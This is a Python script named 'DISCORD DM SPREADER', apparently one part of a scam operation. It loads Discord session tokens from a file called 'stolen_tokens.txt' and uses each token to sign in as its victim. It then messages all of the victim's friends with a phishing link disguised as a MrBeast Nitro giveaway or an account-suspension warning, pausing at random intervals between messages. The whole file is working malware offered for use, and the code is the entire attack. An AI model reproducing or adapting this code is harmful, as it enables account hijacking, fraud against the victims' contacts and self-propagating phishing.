import requests
import json
import time
import random
from concurrent.futures import ThreadPoolExecutor
import os

# ============================================
# CONFIGURATION
# ============================================
TOKENS_FILE = 'stolen_tokens.txt'
SCAM_LINK = 'https://discord.com/ra/3lyYVMWPFRbGCdM66ztdG2Qe8FjTnkfXM75oxQiBXCA'

MESSAGE_TEMPLATES = [
    "🚨 FREE NITRO GIVEAWAY! MrBeast is giving away 1000 Nitro subs! Verify here: {link}",
    "🔥 CLAIM YOUR NITRO NOW! Limited time only: {link}",
    "✅ Discord verified me, now you can too! Get free Nitro: {link}",
    "💎 MrBeast just dropped 5000 Nitro codes! Grab yours: {link}",
    "⚠️ Your account will be suspended unless you verify: {link}",
    "🎁 FREE DISCORD NITRO - MrBeast giveaway! Click: {link}",
    "I just got free Nitro from MrBeast! You can too: {link}"
]

def extract_tokens():
    """Read all tokens from file"""
    tokens = []
    if not os.path.exists(TOKENS_FILE):
        print(f"[ERROR] {TOKENS_FILE} not found")
        return tokens
    
    with open(TOKENS_FILE, 'r', encoding='utf-8') as f:
        for line in f:
            try:
                parts = line.split(' | ')
                if len(parts) == 2:
                    data = json.loads(parts[1].strip())
                    if 'token' in data and data['token']:
                        token = data['token'].strip()
                        if len(token) > 30:
                            tokens.append(token)
            except:
                continue
    
    return tokens

def validate_token(token):
    """Check if token is valid"""
    headers = {'Authorization': token}
    try:
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
        if r.status_code == 200:
            user_data = r.json()
            return True, user_data.get('username', 'Unknown'), user_data.get('id', '0')
        return False, None, None
    except:
        return False, None, None

def get_friends(token):
    """Get victim's friends list"""
    headers = {'Authorization': token}
    try:
        r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers, timeout=5)
        if r.status_code == 200:
            friends = r.json()
            return [f['id'] for f in friends if f.get('type') == 1]
        return []
    except:
        return []

def dm_user(token, user_id, message):
    """Send DM to user"""
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    try:
        # Create DM channel
        r = requests.post('https://discord.com/api/v9/users/@me/channels', 
                          headers=headers, 
                          json={'recipient_id': user_id},
                          timeout=5)
        if r.status_code == 200:
            channel_id = r.json()['id']
            # Send message
            r2 = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages',
                              headers=headers,
                              json={'content': message},
                              timeout=5)
            return r2.status_code == 200
        return False
    except:
        return False

def process_account(token, index, total):
    """Process one account"""
    print(f"[{index}/{total}] Processing: {token[:20]}...")
    
    valid, username, user_id = validate_token(token)
    if not valid:
        print(f"[{index}/{total}] ✗ Invalid")
        return False
    
    print(f"[{index}/{total}] ✓ Logged in as {username} (ID: {user_id})")
    
    friends = get_friends(token)
    if not friends:
        print(f"[{index}/{total}] ⚠ No friends found")
        return False
    
    print(f"[{index}/{total}] Found {len(friends)} friends")
    
    message = random.choice(MESSAGE_TEMPLATES).format(link=SCAM_LINK)
    success_count = 0
    
    for i, friend_id in enumerate(friends):
        if dm_user(token, friend_id, message):
            success_count += 1
            print(f"[{index}/{total}] DM {i+1}/{len(friends)} ✓")
        else:
            print(f"[{index}/{total}] DM {i+1}/{len(friends)} ✗")
        
        time.sleep(random.uniform(1, 3))
    
    print(f"[{index}/{total}] ✓ Sent {success_count}/{len(friends)} DMs")
    return True

def main():
    print("="*60)
    print("DISCORD DM SPREADER")
    print("="*60)
    
    tokens = extract_tokens()
    if not tokens:
        print("[ERROR] No tokens found. Run server first.")
        return
    
    tokens = list(dict.fromkeys(tokens))
    print(f"[INFO] {len(tokens)} unique tokens")
    
    print(f"\n[WARNING] Will DM all friends from {len(tokens)} accounts")
    response = input("Continue? (y/n): ")
    if response.lower() != 'y':
        print("Aborted.")
        return
    
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = []
        for i, token in enumerate(tokens):
            futures.append(executor.submit(process_account, token, i+1, len(tokens)))
            time.sleep(0.5)
        
        for future in futures:
            try:
                future.result()
            except Exception as e:
                print(f"[ERROR] Thread failed: {e}")
    
    print("\n[DONE] All accounts processed.")

if __name__ == '__main__':
    main()
